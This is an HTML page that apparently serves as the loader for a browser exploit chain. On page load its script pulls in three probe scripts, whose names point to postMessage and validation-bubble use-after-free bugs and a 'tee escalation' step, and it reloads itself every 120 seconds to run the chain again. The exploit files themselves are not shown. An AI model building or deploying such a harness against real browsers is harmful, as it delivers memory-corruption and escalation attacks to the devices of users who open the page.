<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>V511-V513 Chain</title>
</head>
<body>
<pre id="log">Loading V511 postMessage OOM UAF probe...</pre>
<script>
var scripts = ['p511-postmessage-oom-uaf.js', 'p512-validation-bubble-uaf.js', 'p513-tee-escalation.js'];
var idx = 0;
function loadNext() {
  if (idx >= scripts.length) {
    document.getElementById('log').textContent += '\nAll probes loaded. Auto-reload in 120s.';
    setTimeout(function() { location.reload(); }, 120000);
    return;
  }
  var s = document.createElement('script');
  s.src = scripts[idx] + '?t=' + Date.now();
  s.onload = function() {
    document.getElementById('log').textContent += '\n' + scripts[idx] + ' loaded OK';
    idx++;
    setTimeout(loadNext, 3000);
  };
  s.onerror = function() {
    document.getElementById('log').textContent += '\n' + scripts[idx] + ' FAILED to load';
    idx++;
    setTimeout(loadNext, 1000);
  };
  document.getElementById('log').textContent += '\nLoading ' + scripts[idx] + '...';
  document.body.appendChild(s);
}
loadNext();
</script>
</body>
</html>
